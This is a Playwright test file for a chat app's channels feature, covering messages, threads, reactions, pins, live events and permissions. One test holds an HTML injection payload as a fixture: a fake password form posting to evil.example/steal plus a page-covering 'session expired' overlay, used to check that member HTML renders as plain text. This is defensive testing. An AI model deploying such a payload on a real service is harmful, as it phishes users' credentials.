import type { Page } from '@playwright/test';
import { fakeSocketServer } from './fake-socket';
import { expect, test } from './test';
import { mockWorkspaceBackend } from './workspace-helpers';

type Rec = Record<string, any>;
const json = (route: any, d: unknown, status = 200) =>
	route.fulfill({ status, contentType: 'application/json', body: JSON.stringify(d) });
const ns = (minutesAgo = 0) => (Date.now() - minutesAgo * 60_000) * 1_000_000;

const ann = { id: 'u2', name: 'Ann', role: 'user' };
const me = { id: 'u1', name: 'Test User', role: 'user' };
const message = (id: string, content: string, extra: Rec = {}) => ({
	id,
	channel_id: 'c1',
	parent_id: null,
	user_id: ann.id,
	user: ann,
	content,
	data: null,
	meta: null,
	reactions: [],
	reply_count: 0,
	is_pinned: false,
	created_at: ns(5),
	updated_at: ns(5),
	...extra
});
const channel = (id: string, name: string, extra: Rec = {}) => ({
	id,
	name,
	type: '',
	user_id: 'u1',
	write_access: true,
	user_count: 3,
	created_at: ns(60 * 24),
	access_grants: [{ principal_type: 'user', principal_id: '*', permission: 'read' }],
	...extra
});

async function mockChannels(
	page: Page,
	{ channels = [channel('c1', 'general')], messages = [] as Rec[], thread = [] as Rec[], pinned = [] as Rec[] } = {}
) {
	const seen = {
		posted: [] as Rec[],
		reactions: [] as string[],
		pins: [] as Rec[],
		updates: [] as Rec[],
		deleted: [] as string[],
		created: [] as Rec[],
		channelUpdates: [] as Rec[],
		memberQueries: [] as string[],
		hidden: [] as string[]
	};
	let list = [...channels];
	// The sidebar defaults closed; these specs read its Channels section.
	await page.context().addInitScript(() => window.localStorage.setItem('sidebar', 'true'));
	await page.route(/\/api\/v1\/channels(\/|\?|$)/, async (route) => {
		const req = route.request();
		const url = new URL(req.url());
		const path = url.pathname.replace(/^.*\/api\/v1\/channels/, '');
		if (path === '/' || path === '') return json(route, list);
		if (path === '/create') {
			const body = req.postDataJSON();
			seen.created.push(body);
			const created = channel('new1', body.name, { type: body.type });
			list = [...list, created];
			return json(route, created);
		}
		const [, id, ...rest] = path.split('/');
		const action = rest.join('/');
		const found = list.find((c) => c.id === id);
		if (!action) return found ? json(route, found) : json(route, { detail: 'Not found' }, 404);
		if (action === 'messages') return json(route, Number(url.searchParams.get('skip')) > 0 ? [] : messages);
		if (action === 'messages/pinned') return json(route, Number(url.searchParams.get('page')) > 1 ? [] : pinned);
		if (action === 'messages/post') {
			const body = req.postDataJSON();
			seen.posted.push(body);
			return json(
				route,
				message(`m${seen.posted.length + 100}`, body.content, {
					user_id: me.id,
					user: me,
					parent_id: body.parent_id ?? null,
					created_at: ns(),
					updated_at: ns()
				})
			);
		}
		if (action === 'members') {
			seen.memberQueries.push(url.search);
			return json(route, {
				users: [
					{ ...ann, email: 'ann@example.com', is_active: true },
					{ ...me, email: 'u@example.com' }
				],
				total: 2
			});
		}
		if (action === 'members/active') {
			seen.hidden.push(id);
			return json(route, true);
		}
		if (action === 'update') {
			seen.channelUpdates.push(req.postDataJSON());
			return json(route, { ...found, ...req.postDataJSON() });
		}
		const m = /^messages\/([^/]+)\/(.+)$/.exec(action);
		if (m) {
			const [, mid, what] = m;
			if (what === 'thread') return json(route, thread);
			if (what === 'pin') seen.pins.push({ mid, ...req.postDataJSON() });
			if (what.startsWith('reactions/')) seen.reactions.push(`${what.split('/')[1]}:${mid}:${req.postDataJSON().name}`);
			if (what === 'update') seen.updates.push({ mid, ...req.postDataJSON() });
			if (what === 'delete') seen.deleted.push(mid);
			return json(route, true);
		}
		return json(route, []);
	});
	await page.route('**/api/models*', (route) => json(route, { data: [{ id: 'qwen', name: 'Qwen' }] }));
	await page.route('**/api/v1/users/search*', (route) =>
		json(route, { users: [{ id: 'u3', name: 'Annika' }], total: 1 })
	);
	return seen;
}

const enabled = { features: { enable_channels: true } };

test('channels are hidden, and the page sends you home, when the feature is off or denied', async ({ page }) => {
	await mockWorkspaceBackend(page, { role: 'user', ...enabled, featurePermissions: { channels: false } });
	await mockChannels(page);
	await page.goto('/channels/c1');
	await expect(page).toHaveURL(/localhost:5174\/$/);
	await expect(page.getByRole('list', { name: 'Channels' })).toHaveCount(0);
});

test('the sidebar lists channels by type with unread badges, and opening one clears its badge', async ({ page }) => {
	await mockWorkspaceBackend(page, { role: 'user', ...enabled });
	await mockChannels(page, {
		channels: [
			channel('d1', '', { type: 'dm', users: [me, ann] }),
			channel('g1', 'team', { type: 'group', is_private: true }),
			channel('c1', 'general', { unread_count: 3 })
		],
		messages: [message('m1', 'hello')]
	});
	await page.goto('/');
	const list = page.getByRole('list', { name: 'Channels' });
	await expect(list.getByRole('link')).toHaveText(['general3', 'team', 'Ann']);
	await list.getByRole('link', { name: /general/ }).click();
	await expect(page).toHaveURL(/\/channels\/c1$/);
	await expect(list.getByRole('link', { name: /general/ })).toHaveText('general');
	await expect(page.getByRole('heading', { name: 'general', level: 1 })).toBeVisible();
});

test('shows messages oldest first with authors, mentions, reactions and a thread summary', async ({ page }) => {
	await mockWorkspaceBackend(page, { role: 'user', ...enabled });
	await mockChannels(page, {
		messages: [
			message('m3', 'third, by me', { user_id: me.id, user: me, created_at: ns(1), updated_at: ns(1) }),
			message('m2', 'second <@U:u1|Test User>', {
				reactions: [{ name: 'thumbsup', users: [me, ann], count: 2 }],
				reply_count: 2,
				latest_reply_at: ns(2)
			}),
			message('m1', 'first')
		]
	});
	await page.goto('/channels/c1');
	const items = page.getByTestId('channel-message');
	await expect(items).toHaveCount(3);
	await expect(items.nth(0)).toContainText('first');
	await expect(items.nth(2)).toContainText('third, by me');
	// Ann's two messages share one author line.
	await expect(items.nth(1).getByText('Ann', { exact: true })).toHaveCount(0);
	await expect(items.nth(1).locator('[data-type="mention"]')).toHaveText('@Test User');
	await expect(items.nth(1).getByRole('button', { name: 'thumbsup 2' })).toHaveAttribute('aria-pressed', 'true');
	await expect(items.nth(1).getByRole('button', { name: /2 Replies/ })).toBeVisible();
	await expect(page.getByText('This is the very beginning of the general channel.')).toBeVisible();
});

test('sends a message with a mention, shows it at once, and reacts, pins, edits and deletes', async ({ page }) => {
	await mockWorkspaceBackend(page, { role: 'user', ...enabled });
	const seen = await mockChannels(page, { messages: [message('m1', 'hello from Ann')] });
	await page.goto('/channels/c1');
	const box = page.getByRole('textbox', { name: 'Message' });
	await box.fill('hi ');
	await box.pressSequentially('@Ann');
	const suggestions = page.getByRole('listbox', { name: 'Mention suggestions' });
	await expect(suggestions.getByRole('option')).toHaveText([/^Ann/, /^Annika/]);
	await page.keyboard.press('Enter');
	await expect(box).toHaveValue('hi @Ann ');
	await box.pressSequentially('welcome');
	await page.keyboard.press('Enter');
	await expect.poll(() => seen.posted.length).toBe(1);
	expect(seen.posted[0]).toMatchObject({ content: 'hi <@U:u2|Ann> welcome', reply_to_id: null });
	await expect(page.getByTestId('channel-message').last()).toContainText('hi @Ann welcome');
	await expect(box).toHaveValue('');

	const first = page.getByTestId('channel-message').first();
	await first.hover();
	await first.getByRole('button', { name: 'Pin' }).click();
	await expect(first.getByText('Pinned', { exact: true })).toBeVisible();
	expect(seen.pins).toEqual([{ mid: 'm1', is_pinned: true }]);

	await first.hover();
	await first.getByRole('button', { name: 'Add Reaction' }).click();
	await page.getByRole('textbox', { name: 'Search emojis' }).fill('thumbsup');
	// 👍's first shortcode is `+1`, which is the name a reaction is stored under.
	await page.getByRole('listbox', { name: 'Emojis' }).getByRole('option').first().click();
	await expect(first.getByRole('button', { name: '+1 1' })).toBeVisible();
	await expect.poll(() => seen.reactions.length).toBe(1);
	expect(seen.reactions).toEqual(['add:m1:+1']);

	// My own message can be edited and deleted.
	const mine = page.getByTestId('channel-message').last();
	await mine.hover();
	await mine.getByRole('button', { name: 'Edit' }).click();
	await mine.getByRole('textbox', { name: 'Edit message' }).fill('edited text');
	await mine.getByRole('button', { name: 'Save' }).click();
	await expect(mine).toContainText('edited text');
	expect(seen.updates[0]).toMatchObject({ content: 'edited text' });
	await mine.hover();
	await mine.getByRole('button', { name: 'Delete' }).click();
	await page.getByRole('alertdialog').getByRole('button', { name: 'Delete' }).click();
	await expect(page.getByTestId('channel-message')).toHaveCount(1);
	expect(seen.deleted).toHaveLength(1);
});

test('replies to a message and opens a thread that posts into it', async ({ page }) => {
	await mockWorkspaceBackend(page, { role: 'user', ...enabled });
	const seen = await mockChannels(page, {
		messages: [message('m1', 'root message', { reply_count: 1, latest_reply_at: ns(1) })],
		thread: [message('t1', 'a reply in the thread', { parent_id: 'm1' })]
	});
	await page.setViewportSize({ width: 1280, height: 800 });
	await page.goto('/channels/c1');
	const root = page.getByTestId('channel-message').first();
	await root.hover();
	await root.getByRole('button', { name: 'Reply', exact: true }).click();
	await expect(page.getByText('Replying to')).toContainText('Ann');
	await page.getByRole('textbox', { name: 'Message' }).first().fill('quoted answer');
	await page.keyboard.press('Enter');
	await expect.poll(() => seen.posted.length).toBe(1);
	expect(seen.posted[0].reply_to_id).toBe('m1');

	await root.getByRole('button', { name: /1 Reply/ }).click();
	const thread = page.getByLabel('Thread', { exact: true });
	await expect(thread.getByText('a reply in the thread')).toBeVisible();
	await thread.getByRole('textbox', { name: 'Message' }).fill('in thread');
	await page.keyboard.press('Enter');
	await expect.poll(() => seen.posted.length).toBe(2);
	expect(seen.posted[1]).toMatchObject({ parent_id: 'm1', content: 'in thread' });
	await expect(thread.getByText('in thread')).toBeVisible();
	await thread.getByRole('button', { name: 'Close thread' }).click();
	await expect(page.getByLabel('Thread', { exact: true })).toHaveCount(0);
});

test("a member's HTML shows as text: no page styles, forms or overlays", async ({ page }) => {
	await mockWorkspaceBackend(page, { role: 'user', ...enabled });
	const attack =
		'hello <style>body{background:rgb(1, 2, 3) !important}</style><form action="https://evil.example/steal"><input type="password"><button>Sign in</button></form><div style="position:fixed;inset:0">Your session expired</div>';
	await mockChannels(page, { messages: [message('m1', attack)] });
	await page.goto('/channels/c1');

	const item = page.getByTestId('channel-message');
	await expect(item).toContainText('<form action="https://evil.example/steal">');
	await expect(item.locator('style, form, input, [style*="fixed"]')).toHaveCount(0);
	expect(await page.evaluate(() => getComputedStyle(document.body).backgroundColor)).not.toBe('rgb(1, 2, 3)');
});

test('a message that arrives while the channel is still loading is not lost', async ({ page }) => {
	await mockWorkspaceBackend(page, { role: 'user', ...enabled });
	const socket = await fakeSocketServer(page);
	await mockChannels(page, { messages: [message('m1', 'hello')] });
	let release!: () => void;
	const gate = new Promise<void>((resolve) => (release = resolve));
	let asked = false;
	await page.route(/\/api\/v1\/channels\/c1\/messages\?/, async (route) => {
		asked = true;
		await gate;
		return json(route, [message('m1', 'hello')]);
	});
	await page.goto('/channels/c1');
	await socket.connected;
	await expect
		.poll(
			() =>
				asked && socket.emitted('events:channel').some((d) => d.channel_id === 'c1' && d.data.type === 'last_read_at')
		)
		.toBe(true);
	socket.emit('events:channel', {
		channel_id: 'c1',
		message_id: null,
		user: ann,
		data: { type: 'message', data: message('m2', 'sent while loading') }
	});
	release();
	await expect(page.getByTestId('channel-message')).toHaveCount(2);
	await expect(page.getByText('sent while loading')).toBeVisible();
});

test('a sent message keeps its author and quote when the response beats the echo', async ({ page }) => {
	await mockWorkspaceBackend(page, { role: 'user', ...enabled });
	await mockChannels(page, { messages: [message('m1', 'hello from Ann')] });
	// The real endpoint answers with the bare message: no user, quote or reactions.
	await page.route('**/api/v1/channels/c1/messages/post', (route) => {
		const body = route.request().postDataJSON();
		return json(route, {
			id: 'm200',
			channel_id: 'c1',
			parent_id: null,
			user_id: me.id,
			content: body.content,
			reply_to_id: body.reply_to_id,
			data: null,
			meta: null,
			created_at: ns(),
			updated_at: ns()
		});
	});
	await page.goto('/channels/c1');
	const first = page.getByTestId('channel-message').first();
	await first.hover();
	await first.getByRole('button', { name: 'Reply', exact: true }).click();
	await page.getByRole('textbox', { name: 'Message' }).fill('my answer');
	await page.keyboard.press('Enter');
	const sent = page.getByTestId('channel-message').filter({ hasText: 'my answer' });
	await expect(sent).toHaveAttribute('id', /m200/);
	await expect(sent).toContainText('Test User');
	await expect(sent).toContainText('hello from Ann');
	await expect(page.getByText('Unknown User')).toHaveCount(0);
});

test('deleting the root from inside its thread closes the thread', async ({ page }) => {
	await mockWorkspaceBackend(page, { role: 'user', ...enabled });
	const mine = { user_id: me.id, user: me };
	// The thread endpoint lists the root with its replies.
	await mockChannels(page, {
		messages: [message('m1', 'my root', { ...mine, reply_count: 1, latest_reply_at: ns(1) })],
		thread: [message('t1', 'a reply', { parent_id: 'm1' }), message('m1', 'my root', mine)]
	});
	await page.setViewportSize({ width: 1280, height: 800 });
	await page.goto('/channels/c1');
	await page
		.getByTestId('channel-message')
		.first()
		.getByRole('button', { name: /1 Reply/ })
		.click();
	const thread = page.getByLabel('Thread', { exact: true });
	const root = thread.getByTestId('channel-message').filter({ hasText: 'my root' });
	await root.hover();
	await root.getByRole('button', { name: 'Delete' }).click();
	await page.getByRole('alertdialog').getByRole('button', { name: 'Delete' }).click();
	await expect(page.getByLabel('Thread', { exact: true })).toHaveCount(0);
});

test('live events: a new message, typing, and an unread badge for another channel', async ({ page }) => {
	await mockWorkspaceBackend(page, { role: 'user', ...enabled });
	const socket = await fakeSocketServer(page);
	await mockChannels(page, {
		channels: [channel('c1', 'general'), channel('c2', 'random')],
		messages: [message('m1', 'hello')]
	});
	await page.goto('/channels/c1');
	await socket.connected;
	await expect(page.getByTestId('channel-message')).toHaveCount(1);
	await expect
		.poll(() => socket.emitted('events:channel').some((d) => d.channel_id === 'c1' && d.data.type === 'last_read_at'))
		.toBe(true);

	socket.emit('events:channel', {
		channel_id: 'c1',
		message_id: null,
		user: ann,
		data: { type: 'typing', data: { typing: true } }
	});
	await expect(page.getByText('Ann is typing...')).toBeVisible();
	socket.emit('events:channel', {
		channel_id: 'c1',
		message_id: null,
		user: ann,
		data: { type: 'message', data: message('m2', 'live message') }
	});
	await expect(page.getByTestId('channel-message')).toHaveCount(2);
	await expect(page.getByText('Ann is typing...')).toHaveCount(0);

	socket.emit('events:channel', {
		channel_id: 'c2',
		user: ann,
		channel: { name: 'random', type: '' },
		data: { type: 'message', data: message('x1', 'over here', { channel_id: 'c2' }) }
	});
	await expect(page.getByRole('list', { name: 'Channels' }).getByRole('link', { name: /random/ })).toHaveText(
		'random1'
	);
	await expect(page.getByText('Ann (#random)')).toBeVisible();

	// Typing in the composer tells the others.
	await page.getByRole('textbox', { name: 'Message' }).pressSequentially('x');
	await expect.poll(() => socket.emitted('events:channel').some((d) => d.data.type === 'typing')).toBe(true);
});

test('pinned messages and the member list', async ({ page }) => {
	await mockWorkspaceBackend(page, { role: 'user', ...enabled });
	const seen = await mockChannels(page, {
		messages: [message('m1', 'hello')],
		pinned: [message('p1', 'an important note', { is_pinned: true })]
	});
	await page.goto('/channels/c1');
	await page.getByRole('button', { name: 'Pinned Messages' }).click();
	const dialog = page.getByRole('dialog', { name: 'Pinned Messages' });
	await expect(dialog.getByText('an important note')).toBeVisible();
	await dialog.getByTestId('channel-message').hover();
	await expect(dialog.getByRole('button', { name: 'Reply' })).toHaveCount(0);
	await dialog.getByRole('button', { name: 'Unpin' }).click();
	await expect(dialog.getByText('No pinned messages')).toBeVisible();
	expect(seen.pins).toEqual([{ mid: 'p1', is_pinned: false }]);
	await page.keyboard.press('Escape');

	await page.getByRole('button', { name: 'User Count' }).click();
	const info = page.getByRole('dialog', { name: '#general' });
	await expect(info.getByRole('list', { name: 'Members' }).getByRole('listitem')).toHaveCount(2);
	await info.getByRole('textbox', { name: 'Search members' }).fill('ann');
	await expect.poll(() => seen.memberQueries.some((q) => q.includes('query=ann'))).toBe(true);
	// Not a group channel manager: no add or remove.
	await expect(info.getByRole('button', { name: 'Add Member' })).toHaveCount(0);
});

test('a read-only channel disables the composer and the message tools', async ({ page }) => {
	await mockWorkspaceBackend(page, { role: 'user', ...enabled });
	await mockChannels(page, {
		channels: [channel('c1', 'announcements', { write_access: false })],
		messages: [message('m1', 'read me')]
	});
	await page.goto('/channels/c1');
	await expect(page.getByRole('textbox', { name: 'Message' })).toBeDisabled();
	await expect(page.getByRole('textbox', { name: 'Message' })).toHaveAttribute(
		'placeholder',
		'You do not have permission to send messages in this channel.'
	);
	await page.getByTestId('channel-message').hover();
	await expect(page.getByRole('button', { name: 'Pin', exact: true })).toHaveCount(0);
	await expect(page.getByRole('button', { name: 'Add Reaction' })).toHaveCount(0);
});

test('creates a group channel from the sidebar and opens it; an admin edits one', async ({ page }) => {
	await mockWorkspaceBackend(page, { role: 'admin', ...enabled });
	const seen = await mockChannels(page);
	await page.goto('/');
	await page.getByRole('button', { name: 'Create Channel' }).click();
	const dialog = page.getByRole('dialog', { name: 'Create Channel' });
	await expect(dialog.getByLabel('Channel Type')).toHaveValue('');
	await dialog.getByLabel('Channel Type').selectOption('group');
	await dialog.getByLabel('Channel Name').fill('My Team');
	await expect(dialog.getByLabel('Channel Name')).toHaveValue('my-team');
	await dialog.getByRole('button', { name: 'Create' }).click();
	await expect(page).toHaveURL(/\/channels\/new1$/);
	expect(seen.created[0]).toMatchObject({ type: 'group', name: 'my-team', is_private: true, access_grants: [] });

	await page.getByRole('list', { name: 'Channels' }).getByRole('link', { name: 'general' }).hover();
	await page.getByRole('button', { name: 'Edit general' }).click();
	const edit = page.getByRole('dialog', { name: 'Edit Channel' });
	await edit.getByLabel('Channel Name').fill('general-chat');
	await edit.getByRole('button', { name: 'Update' }).click();
	await expect.poll(() => seen.channelUpdates.length).toBe(1);
	expect(seen.channelUpdates[0]).toMatchObject({ name: 'general-chat' });
});

test('hiding a DM removes it from the sidebar', async ({ page }) => {
	await mockWorkspaceBackend(page, { role: 'user', ...enabled });
	const seen = await mockChannels(page, { channels: [channel('d1', '', { type: 'dm', users: [me, ann] })] });
	await page.goto('/');
	const list = page.getByRole('list', { name: 'Channels' });
	await list.getByRole('link', { name: 'Ann' }).hover();
	await page.getByRole('button', { name: 'Hide conversation' }).click();
	await expect(list.getByRole('link')).toHaveCount(0);
	expect(seen.hidden).toEqual(['d1']);
});

test('home links to what the user may use; a folder opens a chat inside it', async ({ page }) => {
	await mockWorkspaceBackend(page, { role: 'user', features: { enable_notes: true, enable_calendar: true } });
	await page.route('**/api/v1/folders/f1', (route) => json(route, { id: 'f1', name: 'Research' }));
	await page.route('**/api/models*', (route) => json(route, { data: [] }));
	await page.route('**/api/v1/folders/missing', (route) => json(route, { detail: 'Folder not found' }, 404));
	await page.goto('/home');
	await expect(page.getByRole('navigation', { name: 'Home' }).getByRole('link')).toHaveText(['Notes']);
	await page.goto('/folders/f1');
	await expect(page.getByTestId('chat-folder')).toHaveText('Research');
	await expect(page.getByRole('textbox', { name: 'Message' })).toBeVisible();
	await page.goto('/folders/missing');
	await expect(page).toHaveURL(/localhost:5174\/$/);
});
